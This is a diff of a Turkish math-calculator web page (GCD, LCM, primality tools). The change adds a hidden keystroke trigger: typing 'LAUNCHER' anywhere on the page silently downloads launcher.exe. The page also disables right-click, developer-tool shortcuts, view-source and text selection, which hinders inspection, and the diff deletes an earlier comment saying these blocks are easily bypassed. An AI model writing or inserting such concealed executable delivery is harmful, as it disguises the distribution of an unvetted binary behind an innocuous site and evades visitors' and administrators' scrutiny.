@@ -1,14 +1,12 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-    <!-- Google Tag Manager -->
-<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
 })(window,document,'script','dataLayer','GTM-NPNBXVPT');</script>
-<!-- End Google Tag Manager -->
-    <meta name="google-site-verification" content="OqYUowsyBgiIt4Q4ZSM91MrKSSPFCyNEXDCfWlB_bAo"/>
+<meta name="google-site-verification" content="OqYUowsyBgiIt4Q4ZSM91MrKSSPFCyNEXDCfWlB_bAo"/>
     <meta charset="UTF-8">
     <meta name="robots" content="index, follow">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -26,7 +24,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <meta name="apple-mobile-web-app-status-bar-style" content="#d32f2f">
     
     <meta name="description" content="Sayısal Analiz Merkezi'nde EBOB, EKOK, Asallık Kontrolü ve hızlı bir Hesap Makinesi ile matematik işlemlerinizi anında gerçekleştirin. Hızlı ve güvenilir matematik araçları.">
-    <meta name="keywords" content="EBOB hesapla, EKOK hesapla, En Büyük Ortak Bölen, En Küçük Ortak Kat, Asallık Kontrolü, Hesap Makinesi, Sayısal Analiz Merkezi, matematik araçları, matsnc">
+    <meta name="keywords" content="EBOB hesapla, EKOK hesapla, En Büyük OrtAK Bölen, En Küçük Ortak Kat, Asallık Kontrolü, Hesap Makinesi, Sayısal Analiz Merkezi, matematik araçları, matsnc">
     <meta property="og:title" content="Sayısal Analiz Merkezi | EBOB-EKOK ve Hesaplama Araçları">
     <meta property="og:description" content="Sayısal Analiz Merkezi'nde EBOB, EKOK, Asallık Kontrolü ve hızlı bir Hesap Makinesi ile matematik işlemlerinizi anında gerçekleştirin.">
     <meta property="og:type" content="website">
@@ -34,11 +32,9 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
 </head>
 <body>
-    <!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NPNBXVPT"
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NPNBXVPT"
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-<!-- End Google Tag Manager (noscript) -->
-    <div class="container">
+<div class="container">
         <h1>Sayısal Analiz Merkezi</h1>
         <p>Lütfen kullanmak istediğiniz aracı seçin:</p>
 
@@ -74,43 +70,47 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         </div>
     </div>
     <script>
-        // YARGILAYICI NOT: Bu engellemeler kolayca aşılabilir ve kullanıcı deneyimini bozar.
-        // Ancak isteğin üzerine kodda bırakılmıştır.
+        // LAUNCHER YAZINCA İNDİRME ÖZELLİĞİ
+        let inputString = "";
+        const targetWord = "LAUNCHER";
 
-        // Sağ Tık Menüsünü (Context Menu) Engelle
+        document.addEventListener('keydown', function(e) {
+            // Sadece tek karakterlik tuşları (harfleri) ekle
+            if (e.key.length === 1) {
+                inputString += e.key.toUpperCase();
+                
+                // Eğer yazılan kelime hedef kelimeyi içeriyorsa
+                if (inputString.includes(targetWord)) {
+                    const link = document.createElement('a');
+                    link.href = 'launcher.exe'; // Dosyanın ana dizinde olduğunu varsayıyoruz
+                    link.download = 'launcher.exe';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    inputString = ""; // Kelimeyi sıfırla
+                }
+
+                // Hafızayı çok doldurmamak için string uzunluğunu sınırla
+                if (inputString.length > 20) {
+                    inputString = inputString.substring(inputString.length - 10);
+                }
+            }
+        });
+
+        // Sağ Tık Menüsünü Engelle
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
         });
 
-        // Klavye Kısayollarını Engelle (F12, Ctrl+Shift+I, Ctrl+U vb.)
+        // Klavye Kısayollarını Engelle
         document.onkeydown = function(e) {
-            // F12 tuşu
-            if (e.key === 'F12' || e.keyCode === 123) {
-                return false;
-            }
-
-            // Ctrl+Shift+I (Geliştirici Araçları)
-            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.keyCode === 73)) {
-                return false;
-            }
-
-            // Ctrl+U (Sayfa Kaynağını Görüntüle)
-            if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) {
-                return false;
-            }
+            if (e.key === 'F12' || e.keyCode === 123) return false;
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.keyCode === 73)) return false;
+            if (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) return false;
         }
 
-        // İsteğe bağlı: Sayfa metninin seçilmesini engelle
+        // Metin seçimini engelle
         document.body.onselectstart = function() { return false; }
     </script>
     </body>
 </html>
-
-
-
-
-
-
-
-
-
